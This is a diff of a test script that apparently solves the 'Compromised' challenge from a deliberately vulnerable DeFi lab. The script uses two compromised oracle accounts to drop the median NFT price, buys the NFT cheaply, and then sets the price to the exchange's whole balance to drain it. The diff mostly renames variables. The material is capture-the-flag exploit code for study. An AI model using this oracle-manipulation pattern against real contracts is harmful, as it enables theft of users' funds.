@@ -89,27 +89,27 @@ describe('Compromised challenge', function () {
         console.log(oracle1.address);
         console.log(oracle2.address);
 
-        const orc1Trust = this.oracle.connect(oracle1);
-        const orc2Trust = this.oracle.connect(oracle2);
+        const orc1Trust = oracle.connect(oracle1);
+        const orc2Trust = oracle.connect(oracle2);
 
 
         const setMedianPrice = async (amount) => {
             // Before
-            let currMedianPrice = await this.oracle.getMedianPrice("DVNFT");
+            let currMedianPrice = await oracle.getMedianPrice("DVNFT");
             console.log("Current median price is", currMedianPrice.toString());
 
             console.log("Posting to oracle 1");
             await orc1Trust.postPrice("DVNFT", amount)
             
             // After 1 oracle
-            currMedianPrice = await this.oracle.getMedianPrice("DVNFT");
+            currMedianPrice = await oracle.getMedianPrice("DVNFT");
             console.log("Current median price is", currMedianPrice.toString());
 
             console.log("Posting to oracle 2");
             await orc2Trust.postPrice("DVNFT", amount)
 
             // After 2 oracle
-            currMedianPrice = await this.oracle.getMedianPrice("DVNFT");
+            currMedianPrice = await oracle.getMedianPrice("DVNFT");
             console.log("Current median price is", currMedianPrice.toString());
         }
 
@@ -117,8 +117,8 @@ describe('Compromised challenge', function () {
         let priceToSet = ethers.utils.parseEther("0.01");
         await setMedianPrice(priceToSet);
 
-        const attackExchange = this.exchange.connect(attacker);
-        const attackNFT = this.nftToken.connect(attacker);
+        const attackExchange = exchange.connect(player);
+        const attackNFT = nftToken.connect(player);
 
         // Purchase the NFT
         await attackExchange.buyOne({
@@ -128,10 +128,10 @@ describe('Compromised challenge', function () {
         // Verify that we own the newly minted NFT
         const tokenId = 0;
         const ownerId = await attackNFT.ownerOf(tokenId);
-        expect(ownerId).to.equal(attacker.address);
+        expect(ownerId).to.equal(player.address);
 
         console.log("Setting price to balance of exchange");
-        const balOfExchange = await ethers.provider.getBalance(this.exchange.address);
+        const balOfExchange = await ethers.provider.getBalance(exchange.address);
 
         // Set the price of the NFT to the current balance of the exchange
         priceToSet = balOfExchange
